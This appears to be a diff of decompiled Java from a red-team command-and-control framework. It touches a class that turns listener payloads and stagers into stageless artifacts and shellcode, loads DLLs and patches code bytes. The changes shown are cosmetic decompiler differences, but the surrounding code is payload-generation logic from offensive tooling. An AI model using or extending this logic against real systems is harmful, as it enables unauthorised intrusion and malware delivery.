@@ -231,17 +231,17 @@ public class ArtifactBridge implements Function, Loadable, Predicate {
                   ScListener var3 = ListenerUtils.getListener(ArtifactBridge.this.client, var4);
                   var3.setProxyString(var7);
                   DevLog.log(DevLog.STORY.CS0215_TEST_EXPORT, this.getClass(), "evaluate.result {&artifact_stageless}", "001");
-                  byte[] var4x = (byte[])var3.export(ArtifactBridge.this.client, var6);
+                  byte[] var4x = var3.export(ArtifactBridge.this.client, var6);
                   byte[] var5x = ArtifactBridge.this.toStagelessArtifact(var4x, var6, var5);
                   Stack var6x = new Stack();
                   var6x.push(SleepUtils.getScalar(var5x));
-                  SleepUtils.runCode((SleepClosure)var8, "&artifact_stageless", (ScriptInstance)null, var6x);
+                  SleepUtils.runCode(var8, "&artifact_stageless", (ScriptInstance)null, var6x);
                }
             });
          } else {
-            byte[] var9;
             byte[] var25;
             ScListener var28;
+            byte[] var9;
             if ("&artifact_payload".equals(var1)) {
                var4 = BridgeUtilities.getString(var3, "");
                var5 = BridgeUtilities.getString(var3, "");
@@ -252,7 +252,7 @@ public class ArtifactBridge implements Function, Loadable, Predicate {
                }
 
                DevLog.log(DevLog.STORY.CS0215_TEST_EXPORT, this.getClass(), "evaluate {&artifact_payload}", "002");
-               var25 = (byte[])var28.export(this.client, var6);
+               var25 = var28.export(this.client, var6);
                var9 = this.toStagelessArtifact(var25, var6, var5);
                return SleepUtils.getScalar(var9);
             }
@@ -357,16 +357,16 @@ public class ArtifactBridge implements Function, Loadable, Predicate {
                throw new RuntimeException("'" + var31 + "' is not a valid exit argument");
             }
 
+            Scalar var24;
             if ("&artifact".equals(var1)) {
                var4 = BridgeUtilities.getString(var3, "");
                var5 = BridgeUtilities.getString(var3, "");
-               Scalar var27 = BridgeUtilities.getScalar(var3);
+               var24 = BridgeUtilities.getScalar(var3);
                var7 = BridgeUtilities.getString(var3, "x86");
                ScListener var30 = ListenerUtils.getListener(this.client, var4);
                return SleepUtils.getScalar(this.toArtifact(var30.getPayloadStager(var7), var7, var5));
             }
 
-            Scalar var24;
             if ("&shellcode".equals(var1)) {
                var4 = BridgeUtilities.getString(var3, "");
                var24 = BridgeUtilities.getScalar(var3);
@@ -536,8 +536,8 @@ public class ArtifactBridge implements Function, Loadable, Predicate {
                PEParser var19;
                try {
                   var19 = PEParser.load(var15);
-               } catch (Exception var13) {
-                  throw new RuntimeException("Error loading dll into parser.", var13);
+               } catch (Exception var22) {
+                  throw new RuntimeException("Error loading dll into parser.", var22);
                }
 
                Map var21 = PEParser.dumpToDictionary(var19);
@@ -701,7 +701,10 @@ public class ArtifactBridge implements Function, Loadable, Predicate {
       case 3:
          var14 = CommonUtils.toBytes(BridgeUtilities.getString(var2, ""));
          var16 = CommonUtils.toBytes(BridgeUtilities.getString(var2, ""));
-         DevLog.log(DevLog.STORY.CS0218, this.getClass(), var3, "> findme=" + CommonUtils.toHexString(var14) + " replaceme=" + CommonUtils.toHexString(var16));
+         DevLog.STORY var10000 = DevLog.STORY.CS0218;
+         Class var10001 = this.getClass();
+         String var10003 = CommonUtils.toHexString(var14);
+         DevLog.log(var10000, var10001, var3, "> findme=" + var10003 + " replaceme=" + CommonUtils.toHexString(var16));
          var11.patchCode(var14, var16);
          break;
       case 4:
